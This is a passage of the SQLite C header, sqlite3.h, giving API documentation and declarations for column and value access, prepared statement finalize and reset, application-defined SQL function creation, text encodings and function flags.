** ^The sqlite3_column_type() routine returns the
** [SQLITE_INTEGER | datatype code] for the initial data type
** of the result column.  ^The returned value is one of [SQLITE_INTEGER],
** [SQLITE_FLOAT], [SQLITE_TEXT], [SQLITE_BLOB], or [SQLITE_NULL].
** The return value of sqlite3_column_type() can be used to decide which
** of the first six interface should be used to extract the column value.
** The value returned by sqlite3_column_type() is only meaningful if no
** automatic type conversions have occurred for the value in question.  
** After a type conversion, the result of calling sqlite3_column_type()
** is undefined, though harmless.  Future
** versions of SQLite may change the behavior of sqlite3_column_type()
** following a type conversion.
**
** If the result is a BLOB or a TEXT string, then the sqlite3_column_bytes()
** or sqlite3_column_bytes16() interfaces can be used to determine the size
** of that BLOB or string.
**
** ^If the result is a BLOB or UTF-8 string then the sqlite3_column_bytes()
** routine returns the number of bytes in that BLOB or string.
** ^If the result is a UTF-16 string, then sqlite3_column_bytes() converts
** the string to UTF-8 and then returns the number of bytes.
** ^If the result is a numeric value then sqlite3_column_bytes() uses
** [sqlite3_snprintf()] to convert that value to a UTF-8 string and returns
** the number of bytes in that string.
** ^If the result is NULL, then sqlite3_column_bytes() returns zero.
**
** ^If the result is a BLOB or UTF-16 string then the sqlite3_column_bytes16()
** routine returns the number of bytes in that BLOB or string.
** ^If the result is a UTF-8 string, then sqlite3_column_bytes16() converts
** the string to UTF-16 and then returns the number of bytes.
** ^If the result is a numeric value then sqlite3_column_bytes16() uses
** [sqlite3_snprintf()] to convert that value to a UTF-16 string and returns
** the number of bytes in that string.
** ^If the result is NULL, then sqlite3_column_bytes16() returns zero.
**
** ^The values returned by [sqlite3_column_bytes()] and 
** [sqlite3_column_bytes16()] do not include the zero terminators at the end
** of the string.  ^For clarity: the values returned by
** [sqlite3_column_bytes()] and [sqlite3_column_bytes16()] are the number of
** bytes in the string, not the number of characters.
**
** ^Strings returned by sqlite3_column_text() and sqlite3_column_text16(),
** even empty strings, are always zero-terminated.  ^The return
** value from sqlite3_column_blob() for a zero-length BLOB is a NULL pointer.
**
** <b>Warning:</b> ^The object returned by [sqlite3_column_value()] is an
** [unprotected sqlite3_value] object.  In a multithreaded environment,
** an unprotected sqlite3_value object may only be used safely with
** [sqlite3_bind_value()] and [sqlite3_result_value()].
** If the [unprotected sqlite3_value] object returned by
** [sqlite3_column_value()] is used in any other way, including calls
** to routines like [sqlite3_value_int()], [sqlite3_value_text()],
** or [sqlite3_value_bytes()], the behavior is not threadsafe.
** Hence, the sqlite3_column_value() interface
** is normally only useful within the implementation of 
** [application-defined SQL functions] or [virtual tables], not within
** top-level application code.
**
** The these routines may attempt to convert the datatype of the result.
** ^For example, if the internal representation is FLOAT and a text result
** is requested, [sqlite3_snprintf()] is used internally to perform the
** conversion automatically.  ^(The following table details the conversions
** that are applied:
**
** <blockquote>
** <table border="1">
** <tr><th> Internal<br>Type <th> Requested<br>Type <th>  Conversion
**
** <tr><td>  NULL    <td> INTEGER   <td> Result is 0
** <tr><td>  NULL    <td>  FLOAT    <td> Result is 0.0
** <tr><td>  NULL    <td>   TEXT    <td> Result is a NULL pointer
** <tr><td>  NULL    <td>   BLOB    <td> Result is a NULL pointer
** <tr><td> INTEGER  <td>  FLOAT    <td> Convert from integer to float
** <tr><td> INTEGER  <td>   TEXT    <td> ASCII rendering of the integer
** <tr><td> INTEGER  <td>   BLOB    <td> Same as INTEGER->TEXT
** <tr><td>  FLOAT   <td> INTEGER   <td> [CAST] to INTEGER
** <tr><td>  FLOAT   <td>   TEXT    <td> ASCII rendering of the float
** <tr><td>  FLOAT   <td>   BLOB    <td> [CAST] to BLOB
** <tr><td>  TEXT    <td> INTEGER   <td> [CAST] to INTEGER
** <tr><td>  TEXT    <td>  FLOAT    <td> [CAST] to REAL
** <tr><td>  TEXT    <td>   BLOB    <td> No change
** <tr><td>  BLOB    <td> INTEGER   <td> [CAST] to INTEGER
** <tr><td>  BLOB    <td>  FLOAT    <td> [CAST] to REAL
** <tr><td>  BLOB    <td>   TEXT    <td> Add a zero terminator if needed
** </table>
** </blockquote>)^
**
** Note that when type conversions occur, pointers returned by prior
** calls to sqlite3_column_blob(), sqlite3_column_text(), and/or
** sqlite3_column_text16() may be invalidated.
** Type conversions and pointer invalidations might occur
** in the following cases:
**
** <ul>
** <li> The initial content is a BLOB and sqlite3_column_text() or
**      sqlite3_column_text16() is called.  A zero-terminator might
**      need to be added to the string.</li>
** <li> The initial content is UTF-8 text and sqlite3_column_bytes16() or
**      sqlite3_column_text16() is called.  The content must be converted
**      to UTF-16.</li>
** <li> The initial content is UTF-16 text and sqlite3_column_bytes() or
**      sqlite3_column_text() is called.  The content must be converted
**      to UTF-8.</li>
** </ul>
**
** ^Conversions between UTF-16be and UTF-16le are always done in place and do
** not invalidate a prior pointer, though of course the content of the buffer
** that the prior pointer references will have been modified.  Other kinds
** of conversion are done in place when it is possible, but sometimes they
** are not possible and in those cases prior pointers are invalidated.
**
** The safest policy is to invoke these routines
** in one of the following ways:
**
** <ul>
**  <li>sqlite3_column_text() followed by sqlite3_column_bytes()</li>
**  <li>sqlite3_column_blob() followed by sqlite3_column_bytes()</li>
**  <li>sqlite3_column_text16() followed by sqlite3_column_bytes16()</li>
** </ul>
**
** In other words, you should call sqlite3_column_text(),
** sqlite3_column_blob(), or sqlite3_column_text16() first to force the result
** into the desired format, then invoke sqlite3_column_bytes() or
** sqlite3_column_bytes16() to find the size of the result.  Do not mix calls
** to sqlite3_column_text() or sqlite3_column_blob() with calls to
** sqlite3_column_bytes16(), and do not mix calls to sqlite3_column_text16()
** with calls to sqlite3_column_bytes().
**
** ^The pointers returned are valid until a type conversion occurs as
** described above, or until [sqlite3_step()] or [sqlite3_reset()] or
** [sqlite3_finalize()] is called.  ^The memory space used to hold strings
** and BLOBs is freed automatically.  Do not pass the pointers returned
** from [sqlite3_column_blob()], [sqlite3_column_text()], etc. into
** [sqlite3_free()].
**
** As long as the input parameters are correct, these routines will only
** fail if an out-of-memory error occurs during a format conversion.
** Only the following subset of interfaces are subject to out-of-memory
** errors:
**
** <ul>
** <li> sqlite3_column_blob()
** <li> sqlite3_column_text()
** <li> sqlite3_column_text16()
** <li> sqlite3_column_bytes()
** <li> sqlite3_column_bytes16()
** </ul>
**
** If an out-of-memory error occurs, then the return value from these
** routines is the same as if the column had contained an SQL NULL value.
** Valid SQL NULL returns can be distinguished from out-of-memory errors
** by invoking the [sqlite3_errcode()] immediately after the suspect
** return value is obtained and before any
** other SQLite interface is called on the same [database connection].
*/
SQLITE_API const void *sqlite3_column_blob(sqlite3_stmt*, int iCol);
SQLITE_API double sqlite3_column_double(sqlite3_stmt*, int iCol);
SQLITE_API int sqlite3_column_int(sqlite3_stmt*, int iCol);
SQLITE_API sqlite3_int64 sqlite3_column_int64(sqlite3_stmt*, int iCol);
SQLITE_API const unsigned char *sqlite3_column_text(sqlite3_stmt*, int iCol);
SQLITE_API const void *sqlite3_column_text16(sqlite3_stmt*, int iCol);
SQLITE_API sqlite3_value *sqlite3_column_value(sqlite3_stmt*, int iCol);
SQLITE_API int sqlite3_column_bytes(sqlite3_stmt*, int iCol);
SQLITE_API int sqlite3_column_bytes16(sqlite3_stmt*, int iCol);
SQLITE_API int sqlite3_column_type(sqlite3_stmt*, int iCol);

/*
** CAPI3REF: Destroy A Prepared Statement Object
** DESTRUCTOR: sqlite3_stmt
**
** ^The sqlite3_finalize() function is called to delete a [prepared statement].
** ^If the most recent evaluation of the statement encountered no errors
** or if the statement is never been evaluated, then sqlite3_finalize() returns
** SQLITE_OK.  ^If the most recent evaluation of statement S failed, then
** sqlite3_finalize(S) returns the appropriate [error code] or
** [extended error code].
**
** ^The sqlite3_finalize(S) routine can be called at any point during
** the life cycle of [prepared statement] S:
** before statement S is ever evaluated, after
** one or more calls to [sqlite3_reset()], or after any call
** to [sqlite3_step()] regardless of whether or not the statement has
** completed execution.
**
** ^Invoking sqlite3_finalize() on a NULL pointer is a harmless no-op.
**
** The application must finalize every [prepared statement] in order to avoid
** resource leaks.  It is a grievous error for the application to try to use
** a prepared statement after it has been finalized.  Any use of a prepared
** statement after it has been finalized can result in undefined and
** undesirable behavior such as segfaults and heap corruption.
*/
SQLITE_API int sqlite3_finalize(sqlite3_stmt *pStmt);

/*
** CAPI3REF: Reset A Prepared Statement Object
** METHOD: sqlite3_stmt
**
** The sqlite3_reset() function is called to reset a [prepared statement]
** object back to its initial state, ready to be re-executed.
** ^Any SQL statement variables that had values bound to them using
** the [sqlite3_bind_blob | sqlite3_bind_*() API] retain their values.
** Use [sqlite3_clear_bindings()] to reset the bindings.
**
** ^The [sqlite3_reset(S)] interface resets the [prepared statement] S
** back to the beginning of its program.
**
** ^If the most recent call to [sqlite3_step(S)] for the
** [prepared statement] S returned [SQLITE_ROW] or [SQLITE_DONE],
** or if [sqlite3_step(S)] has never before been called on S,
** then [sqlite3_reset(S)] returns [SQLITE_OK].
**
** ^If the most recent call to [sqlite3_step(S)] for the
** [prepared statement] S indicated an error, then
** [sqlite3_reset(S)] returns an appropriate [error code].
**
** ^The [sqlite3_reset(S)] interface does not change the values
** of any [sqlite3_bind_blob|bindings] on the [prepared statement] S.
*/
SQLITE_API int sqlite3_reset(sqlite3_stmt *pStmt);

/*
** CAPI3REF: Create Or Redefine SQL Functions
** KEYWORDS: {function creation routines}
** KEYWORDS: {application-defined SQL function}
** KEYWORDS: {application-defined SQL functions}
** METHOD: sqlite3
**
** ^These functions (collectively known as "function creation routines")
** are used to add SQL functions or aggregates or to redefine the behavior
** of existing SQL functions or aggregates. The only differences between
** the three "sqlite3_create_function*" routines are the text encoding 
** expected for the second parameter (the name of the function being 
** created) and the presence or absence of a destructor callback for
** the application data pointer. Function sqlite3_create_window_function()
** is similar, but allows the user to supply the extra callback functions
** needed by [aggregate window functions].
**
** ^The first parameter is the [database connection] to which the SQL
** function is to be added.  ^If an application uses more than one database
** connection then application-defined SQL functions must be added
** to each database connection separately.
**
** ^The second parameter is the name of the SQL function to be created or
** redefined.  ^The length of the name is limited to 255 bytes in a UTF-8
** representation, exclusive of the zero-terminator.  ^Note that the name
** length limit is in UTF-8 bytes, not characters nor UTF-16 bytes.  
** ^Any attempt to create a function with a longer name
** will result in [SQLITE_MISUSE] being returned.
**
** ^The third parameter (nArg)
** is the number of arguments that the SQL function or
** aggregate takes. ^If this parameter is -1, then the SQL function or
** aggregate may take any number of arguments between 0 and the limit
** set by [sqlite3_limit]([SQLITE_LIMIT_FUNCTION_ARG]).  If the third
** parameter is less than -1 or greater than 127 then the behavior is
** undefined.
**
** ^The fourth parameter, eTextRep, specifies what
** [SQLITE_UTF8 | text encoding] this SQL function prefers for
** its parameters.  The application should set this parameter to
** [SQLITE_UTF16LE] if the function implementation invokes 
** [sqlite3_value_text16le()] on an input, or [SQLITE_UTF16BE] if the
** implementation invokes [sqlite3_value_text16be()] on an input, or
** [SQLITE_UTF16] if [sqlite3_value_text16()] is used, or [SQLITE_UTF8]
** otherwise.  ^The same SQL function may be registered multiple times using
** different preferred text encodings, with different implementations for
** each encoding.
** ^When multiple implementations of the same function are available, SQLite
** will pick the one that involves the least amount of data conversion.
**
** ^The fourth parameter may optionally be ORed with [SQLITE_DETERMINISTIC]
** to signal that the function will always return the same result given
** the same inputs within a single SQL statement.  Most SQL functions are
** deterministic.  The built-in [random()] SQL function is an example of a
** function that is not deterministic.  The SQLite query planner is able to
** perform additional optimizations on deterministic functions, so use
** of the [SQLITE_DETERMINISTIC] flag is recommended where possible.
**
** ^The fourth parameter may also optionally include the [SQLITE_DIRECTONLY]
** flag, which if present prevents the function from being invoked from
** within VIEWs or TRIGGERs.  For security reasons, the [SQLITE_DIRECTONLY]
** flag is recommended for any application-defined SQL function that has
** side-effects.
**
** ^(The fifth parameter is an arbitrary pointer.  The implementation of the
** function can gain access to this pointer using [sqlite3_user_data()].)^
**
** ^The sixth, seventh and eighth parameters passed to the three
** "sqlite3_create_function*" functions, xFunc, xStep and xFinal, are
** pointers to C-language functions that implement the SQL function or
** aggregate. ^A scalar SQL function requires an implementation of the xFunc
** callback only; NULL pointers must be passed as the xStep and xFinal
** parameters. ^An aggregate SQL function requires an implementation of xStep
** and xFinal and NULL pointer must be passed for xFunc. ^To delete an existing
** SQL function or aggregate, pass NULL pointers for all three function
** callbacks.
**
** ^The sixth, seventh, eighth and ninth parameters (xStep, xFinal, xValue 
** and xInverse) passed to sqlite3_create_window_function are pointers to
** C-language callbacks that implement the new function. xStep and xFinal
** must both be non-NULL. xValue and xInverse may either both be NULL, in
** which case a regular aggregate function is created, or must both be 
** non-NULL, in which case the new function may be used as either an aggregate
** or aggregate window function. More details regarding the implementation
** of aggregate window functions are 
** [user-defined window functions|available here].
**
** ^(If the final parameter to sqlite3_create_function_v2() or
** sqlite3_create_window_function() is not NULL, then it is destructor for
** the application data pointer. The destructor is invoked when the function 
** is deleted, either by being overloaded or when the database connection 
** closes.)^ ^The destructor is also invoked if the call to 
** sqlite3_create_function_v2() fails.  ^When the destructor callback is
** invoked, it is passed a single argument which is a copy of the application
** data pointer which was the fifth parameter to sqlite3_create_function_v2().
**
** ^It is permitted to register multiple implementations of the same
** functions with the same name but with either differing numbers of
** arguments or differing preferred text encodings.  ^SQLite will use
** the implementation that most closely matches the way in which the
** SQL function is used.  ^A function implementation with a non-negative
** nArg parameter is a better match than a function implementation with
** a negative nArg.  ^A function where the preferred text encoding
** matches the database encoding is a better
** match than a function where the encoding is different.  
** ^A function where the encoding difference is between UTF16le and UTF16be
** is a closer match than a function where the encoding difference is
** between UTF8 and UTF16.
**
** ^Built-in functions may be overloaded by new application-defined functions.
**
** ^An application-defined function is permitted to call other
** SQLite interfaces.  However, such calls must not
** close the database connection nor finalize or reset the prepared
** statement in which the function is running.
*/
SQLITE_API int sqlite3_create_function(
  sqlite3 *db,
  const char *zFunctionName,
  int nArg,
  int eTextRep,
  void *pApp,
  void (*xFunc)(sqlite3_context*,int,sqlite3_value**),
  void (*xStep)(sqlite3_context*,int,sqlite3_value**),
  void (*xFinal)(sqlite3_context*)
);
SQLITE_API int sqlite3_create_function16(
  sqlite3 *db,
  const void *zFunctionName,
  int nArg,
  int eTextRep,
  void *pApp,
  void (*xFunc)(sqlite3_context*,int,sqlite3_value**),
  void (*xStep)(sqlite3_context*,int,sqlite3_value**),
  void (*xFinal)(sqlite3_context*)
);
SQLITE_API int sqlite3_create_function_v2(
  sqlite3 *db,
  const char *zFunctionName,
  int nArg,
  int eTextRep,
  void *pApp,
  void (*xFunc)(sqlite3_context*,int,sqlite3_value**),
  void (*xStep)(sqlite3_context*,int,sqlite3_value**),
  void (*xFinal)(sqlite3_context*),
  void(*xDestroy)(void*)
);
SQLITE_API int sqlite3_create_window_function(
  sqlite3 *db,
  const char *zFunctionName,
  int nArg,
  int eTextRep,
  void *pApp,
  void (*xStep)(sqlite3_context*,int,sqlite3_value**),
  void (*xFinal)(sqlite3_context*),
  void (*xValue)(sqlite3_context*),
  void (*xInverse)(sqlite3_context*,int,sqlite3_value**),
  void(*xDestroy)(void*)
);

/*
** CAPI3REF: Text Encodings
**
** These constant define integer codes that represent the various
** text encodings supported by SQLite.
*/
#define SQLITE_UTF8           1    /* IMP: R-37514-35566 */
#define SQLITE_UTF16LE        2    /* IMP: R-03371-37637 */
#define SQLITE_UTF16BE        3    /* IMP: R-51971-34154 */
#define SQLITE_UTF16          4    /* Use native byte order */
#define SQLITE_ANY            5    /* Deprecated */
#define SQLITE_UTF16_ALIGNED  8    /* sqlite3_create_collation only */

/*
** CAPI3REF: Function Flags
**
** These constants may be ORed together with the 
** [SQLITE_UTF8 | preferred text encoding] as the fourth argument
** to [sqlite3_create_function()], [sqlite3_create_function16()], or
** [sqlite3_create_function_v2()].
**
** The SQLITE_DETERMINISTIC flag means that the new function will always
** maps the same inputs into the same output.  The abs() function is
** deterministic, for example, but randomblob() is not.
**
** The SQLITE_DIRECTONLY flag means that the function may only be invoked
** from top-level SQL, and cannot be used in VIEWs or TRIGGERs.  This is
** a security feature which is recommended for all 
** [application-defined SQL functions] that have side-effects.  This flag 
** prevents an attacker from adding triggers and views to a schema then 
** tricking a high-privilege application into causing unintended side-effects
** while performing ordinary queries.
**
** The SQLITE_SUBTYPE flag indicates to SQLite that a function may call
** [sqlite3_value_subtype()] to inspect the sub-types of its arguments.
** Specifying this flag makes no difference for scalar or aggregate user
** functions. However, if it is not specified for a user-defined window
** function, then any sub-types belonging to arguments passed to the window
** function may be discarded before the window function is called (i.e.
** sqlite3_value_subtype() will always return 0).
*/
#define SQLITE_DETERMINISTIC    0x000000800
#define SQLITE_DIRECTONLY       0x000080000
#define SQLITE_SUBTYPE          0x000100000

/*
** CAPI3REF: Deprecated Functions
** DEPRECATED
**
** These functions are [deprecated].  In order to maintain
** backwards compatibility with older code, these functions continue 
** to be supported.  However, new applications should avoid
** the use of these functions.  To encourage programmers to avoid
** these functions, we will not explain what they do.
*/
#ifndef SQLITE_OMIT_DEPRECATED
SQLITE_API SQLITE_DEPRECATED int sqlite3_aggregate_count(sqlite3_context*);
SQLITE_API SQLITE_DEPRECATED int sqlite3_expired(sqlite3_stmt*);
SQLITE_API SQLITE_DEPRECATED int sqlite3_transfer_bindings(sqlite3_stmt*, sqlite3_stmt*);
SQLITE_API SQLITE_DEPRECATED int sqlite3_global_recover(void);
SQLITE_API SQLITE_DEPRECATED void sqlite3_thread_cleanup(void);
SQLITE_API SQLITE_DEPRECATED int sqlite3_memory_alarm(void(*)(void*,sqlite3_int64,int),
                      void*,sqlite3_int64);
#endif

/*
** CAPI3REF: Obtaining SQL Values
** METHOD: sqlite3_value
**
** <b>Summary:</b>
** <blockquote><table border=0 cellpadding=0 cellspacing=0>
** <tr><td><b>sqlite3_value_blob</b><td>&rarr;<td>BLOB value
** <tr><td><b>sqlite3_value_double</b><td>&rarr;<td>REAL value
** <tr><td><b>sqlite3_value_int</b><td>&rarr;<td>32-bit INTEGER value
** <tr><td><b>sqlite3_value_int64</b><td>&rarr;<td>64-bit INTEGER value
** <tr><td><b>sqlite3_value_pointer</b><td>&rarr;<td>Pointer value
** <tr><td><b>sqlite3_value_text</b><td>&rarr;<td>UTF-8 TEXT value
** <tr><td><b>sqlite3_value_text16</b><td>&rarr;<td>UTF-16 TEXT value in
** the native byteorder
** <tr><td><b>sqlite3_value_text16be</b><td>&rarr;<td>UTF-16be TEXT value
** <tr><td><b>sqlite3_value_text16le</b><td>&rarr;<td>UTF-16le TEXT value
** <tr><td>&nbsp;<td>&nbsp;<td>&nbsp;
** <tr><td><b>sqlite3_value_bytes</b><td>&rarr;<td>Size of a BLOB
** or a UTF-8 TEXT in bytes
** <tr><td><b>sqlite3_value_bytes16&nbsp;&nbsp;</b>
** <td>&rarr;&nbsp;&nbsp;<td>Size of UTF-16
** TEXT in bytes
** <tr><td><b>sqlite3_value_type</b><td>&rarr;<td>Default
** datatype of the value
** <tr><td><b>sqlite3_value_numeric_type&nbsp;&nbsp;</b>
** <td>&rarr;&nbsp;&nbsp;<td>Best numeric datatype of the value
** <tr><td><b>sqlite3_value_nochange&nbsp;&nbsp;</b>
** <td>&rarr;&nbsp;&nbsp;<td>True if the column is unchanged in an UPDATE
** against a virtual table.
** <tr><td><b>sqlite3_value_frombind&nbsp;&nbsp;</b>
** <td>&rarr;&nbsp;&nbsp;<td>True if value originated from a [bound parameter]
** </table></blockquote>
**
** <b>Details:</b>
**
** These routines extract type, size, and content information from
** [protected sqlite3_value] objects.  Protected sqlite3_value objects
** are used to pass parameter information into implementation of
** [application-defined SQL functions] and [virtual tables].
**
** These routines work only with [protected sqlite3_value] objects.
** Any attempt to use these routines on an [unprotected sqlite3_value]
** is not threadsafe.
**
** ^These routines work just like the corresponding [column access functions]
** except that these routines take a single [protected sqlite3_value] object
** pointer instead of a [sqlite3_stmt*] pointer and an integer column number.
**
** ^The sqlite3_value_text16() interface extracts a UTF-16 string
** in the native byte-order of the host machine.  ^The
** sqlite3_value_text16be() and sqlite3_value_text16le() interfaces
** extract UTF-16 strings as big-endian and little-endian respectively.
**
** ^If [sqlite3_value] object V was initialized 
** using [sqlite3_bind_pointer(S,I,P,X,D)] or [sqlite3_result_pointer(C,P,X,D)]
** and if X and Y are strings that compare equal according to strcmp(X,Y),
** then sqlite3_value_pointer(V,Y) will return the pointer P.  ^Otherwise,
** sqlite3_value_pointer(V,Y) returns a NULL. The sqlite3_bind_pointer() 
** routine is part of the [pointer passing interface] added for SQLite 3.20.0.
**
** ^(The sqlite3_value_type(V) interface returns the
** [SQLITE_INTEGER | datatype code] for the initial datatype of the
** [sqlite3_value] object V. The returned value is one of [SQLITE_INTEGER],
** [SQLITE_FLOAT], [SQLITE_TEXT], [SQLITE_BLOB], or [SQLITE_NULL].)^
** Other interfaces might change the datatype for an sqlite3_value object.
** For example, if the datatype is initially SQLITE_INTEGER and
** sqlite3_value_text(V) is called to extract a text value for that
** integer, then subsequent calls to sqlite3_value_type(V) might return
** SQLITE_TEXT.  Whether or not a persistent internal datatype conversion
** occurs is undefined and may change from one release of SQLite to the next.
**
** ^(The sqlite3_value_numeric_type() interface attempts to apply
** numeric affinity to the value.  This means that an attempt is
** made to convert the value to an integer or floating point.  If
** such a conversion is possible without loss of information (in other
** words, if the value is a string that looks like a number)
** then the conversion is performed.  Otherwise no conversion occurs.
** The [SQLITE_INTEGER | datatype] after conversion is returned.)^
**
** ^Within the [xUpdate] method of a [virtual table], the
** sqlite3_value_nochange(X) interface returns true if and only if
** the column corresponding to X is unchanged by the UPDATE operation
** that the xUpdate method call was invoked to implement and if
** and the prior [xColumn] method call that was invoked to extracted
** the value for that column returned without setting a result (probably
** because it queried [sqlite3_vtab_nochange()] and found that the column
** was unchanging).  ^Within an [xUpdate] method, any value for which
** sqlite3_value_nochange(X) is true will in all other respects appear
** to be a NULL value.  If sqlite3_value_nochange(X) is invoked anywhere other
** than within an [xUpdate] method call for an UPDATE statement, then
** the return value is arbitrary and meaningless.
**
** ^The sqlite3_value_frombind(X) interface returns non-zero if the
** value X originated from one of the [sqlite3_bind_int|sqlite3_bind()]
** interfaces.  ^If X comes from an SQL literal value, or a table column,
** and expression, then sqlite3_value_frombind(X) returns zero.
**
** Please pay particular attention to the fact that the pointer returned
** from [sqlite3_value_blob()], [sqlite3_value_text()], or
** [sqlite3_value_text16()] can be invalidated by a subsequent call to
** [sqlite3_value_bytes()], [sqlite3_value_bytes16()], [sqlite3_value_text()],
** or [sqlite3_value_text16()].
**
** These routines must be called from the same thread as
** the SQL function that supplied the [sqlite3_value*] parameters.
**
** As long as the input parameter is correct, these routines can only
** fail if an out-of-memory error occurs during a format conversion.
** Only the following subset of interfaces are subject to out-of-memory
** errors:
**
** <ul>
** <li> sqlite3_value_blob()
** <li> sqlite3_value_text()
** <li> sqlite3_value_text16()
** <li> sqlite3_value_text16le()
** <li> sqlite3_value_text16be()
** <li> sqlite3_value_bytes()
** <li> sqlite3_value_bytes16()
** </ul>
**
** If an out-of-memory error occurs, then the return value from these
** routines is the same as if the column had contained an SQL NULL value.
** Valid SQL NULL returns can be distinguished from out-of-memory errors
** by invoking the [sqlite3_errcode()] immediately after the suspect
** return value is obtained and before any
** other SQLite interface is called on the same [database connection].
*/
SQLITE_API const void *sqlite3_value_blob(sqlite3_value*);
SQLITE_API double sqlite3_value_double(sqlite3_value*);
SQLITE_API int sqlite3_value_int(sqlite3_value*);
SQLITE_API sqlite3_int64 sqlite3_value_int64(sqlite3_value*);
SQLITE_API void *sqlite3_value_pointer(sqlite3_value*, const char*);
SQLITE_API const unsigned char *sqlite3_value_text(sqlite3_value*);
SQLITE_API const void *sqlite3_value_text16(sqlite3_value*);
SQLITE_API const void *sqlite3_value_text16le(sqlite3_value*);
SQLITE_API const void *sqlite3_value_text16be(sqlite3_value*);
SQLITE_API int sqlite3_value_bytes(sqlite3_value*);
SQLITE_API int sqlite3_value_bytes16(sqlite3_value*);
SQLITE_API int sqlite3_value_type(sqlite3_value*);
SQLITE_API int sqlite3_value_numeric_type(sqlite3_value*);
SQLITE_API int sqlite3_value_nochange(sqlite3_value*);
SQLITE_API int sqlite3_value_frombind(sqlite3_value*);

/*
** CAPI3REF: Finding The Subtype Of SQL Values
** METHOD: sqlite3_value
**
** The sqlite3_value_subtype(V) function returns the subtype for
** an [application-defined SQL function] argument V.  The subtype
** information can be used to pass a limited amount of context from
** one SQL function to another.  Use the [sqlite3_result_subtype()]
** routine to set the subtype for the return value of an SQL function.
*/
SQLITE_API unsigned int sqlite3_value_subtype(sqlite3_value*);

/*
** CAPI3REF: Copy And Free SQL Values
** METHOD: sqlite3_value
**
** ^The sqlite3_value_dup(V) interface makes a copy of the [sqlite3_value]
** object D and returns a pointer to that copy.  ^The [sqlite3_value] returned
** is a [protected sqlite3_value] object even if the input is not.
** ^The sqlite3_value_dup(V) interface returns NULL if V is NULL or if a
** memory allocation fails.
**
** ^The sqlite3_value_free(V) interface frees an [sqlite3_value] object
** previously obtained from [sqlite3_value_dup()].  ^If V is a NULL pointer
** then sqlite3_value_free(V) is a harmless no-op.
*/
SQLITE_API sqlite3_value *sqlite3_value_dup(const sqlite3_value*);
SQLITE_API void sqlite3_value_free(sqlite3_value*);

/*
** CAPI3REF: Obtain Aggregate Function Context
** METHOD: sqlite3_context
**
** Implementations of aggregate SQL functions use this
** routine to allocate memory for storing their state.
**
** ^The first time the sqlite3_aggregate_context(C,N) routine is called 
** for a particular aggregate function, SQLite
** allocates N of memory, zeroes out that memory, and returns a pointer
** to the new memory. ^On second and subsequent calls to
** sqlite3_aggregate_context() for the same aggregate function instance,
** the same buffer is returned.  Sqlite3_aggregate_context() is normally
** called once for each invocation of the xStep callback and then one
** last time when the xFinal callback is invoked.  ^(When no rows match
** an aggregate query, the xStep() callback of the aggregate function
** implementation is never called and xFinal() is called exactly once.
** In those cases, sqlite3_aggregate_context() might be called for the
** first time from within xFinal().)^
**
** ^The sqlite3_aggregate_context(C,N) routine returns a NULL pointer 
** when first called if N is less than or equal to zero or if a memory
** allocate error occurs.
**
** ^(The amount of space allocated by sqlite3_aggregate_context(C,N) is
** determined by the N parameter on first successful call.  Changing the
** value of N in subsequent call to sqlite3_aggregate_context() within
** the same aggregate function instance will not resize the memory
** allocation.)^  Within the xFinal callback, it is customary to set
** N=0 in calls to sqlite3_aggregate_context(C,N) so that no 
** pointless memory allocations occur.
**
** ^SQLite automatically frees the memory allocated by 
** sqlite3_aggregate_context() when the aggregate query concludes.
**
** The first parameter must be a copy of the
** [sqlite3_context | SQL function context] that is the first parameter
** to the xStep or xFinal callback routine that implements the aggregate
** function.
**
** This routine must be called from the same thread in which
** the aggregate SQL function is running.
*/
SQLITE_API void *sqlite3_aggregate_context(sqlite3_context*, int nBytes);

/*
** CAPI3REF: User Data For Functions
** METHOD: sqlite3_context
**
** ^The sqlite3_user_data() interface returns a copy of
** the pointer that was the pUserData parameter (the 5th parameter)
** of the [sqlite3_create_function()]
** and [sqlite3_create_function16()] routines that originally
** registered the application defined function.
**
** This routine must be called from the same thread in which
** the application-defined function is running.
*/
SQLITE_API void *sqlite3_user_data(sqlite3_context*);

/*
** CAPI3REF: Database Connection For Functions
** METHOD: sqlite3_context
**
** ^The sqlite3_context_db_handle() interface returns a copy of
** the pointer to the [database connection] (the 1st parameter)
** of the [sqlite3_create_function()]
** and [sqlite3_create_function16()] routines that originally
** registered the application defined function.
*/
SQLITE_API sqlite3 *sqlite3_context_db_handle(sqlite3_context*);

/*
** CAPI3REF: Function Auxiliary Data
** METHOD: sqlite3_context
**
** These functions may be used by (non-aggregate) SQL functions to
** associate metadata with argument values. If the same value is passed to
** multiple invocations of the same SQL function during query execution, under
** some circumstances the associated metadata may be preserved.  An example
** of where this might be useful is in a regular-expression matching
** function. The compiled version of the regular expression can be stored as
** metadata associated with the pattern string.  
** Then as long as the pattern string remains the same,
** the compiled regular expression can be reused on multiple
** invocations of the same function.
**
** ^The sqlite3_get_auxdata(C,N) interface returns a pointer to the metadata
** associated by the sqlite3_set_auxdata(C,N,P,X) function with the Nth argument
** value to the application-defined function.  ^N is zero for the left-most
** function argument.  ^If there is no metadata
** associated with the function argument, the sqlite3_get_auxdata(C,N) interface
** returns a NULL pointer.
**
** ^The sqlite3_set_auxdata(C,N,P,X) interface saves P as metadata for the N-th
** argument of the application-defined function.  ^Subsequent
** calls to sqlite3_get_auxdata(C,N) return P from the most recent
** sqlite3_set_auxdata(C,N,P,X) call if the metadata is still valid or
** NULL if the metadata has been discarded.
** ^After each call to sqlite3_set_auxdata(C,N,P,X) where X is not NULL,
** SQLite will invoke the destructor function X with parameter P exactly
** once, when the metadata is discarded.
** SQLite is free to discard the metadata at any time, including: <ul>
** <li> ^(when the corresponding function parameter changes)^, or
** <li> ^(when [sqlite3_reset()] or [sqlite3_finalize()] is called for the
**      SQL statement)^, or
** <li> ^(when sqlite3_set_auxdata() is invoked again on the same
**       parameter)^, or
** <li> ^(during the original sqlite3_set_auxdata() call when a memory 
**      allocation error occurs.)^ </ul>
**
** Note the last bullet in particular.  The destructor X in 
** sqlite3_set_auxdata(C,N,P,X) might be called immediately, before the
** sqlite3_set_auxdata() interface even returns.  Hence sqlite3_set_auxdata()
** should be called near the end of the function implementation and the
** function implementation should not make any use of P after
** sqlite3_set_auxdata() has been called.
**
** ^(In practice, metadata is preserved between function calls for
** function parameters that are compile-time constants, including literal
** values and [parameters] and expressions composed from the same.)^
**
** The value of the N parameter to these interfaces should be non-negative.
** Future enhancements may make use of negative N values to define new
** kinds of function caching behavior.
**
** These routines must be called from the same thread in which
** the SQL function is running.
*/
SQLITE_API void *sqlite3_get_auxdata(sqlite3_context*, int N);
SQLITE_API void sqlite3_set_auxdata(sqlite3_context*, int N, void*, void (*)(void*));


/*
** CAPI3REF: Constants Defining Special Destructor Behavior
**
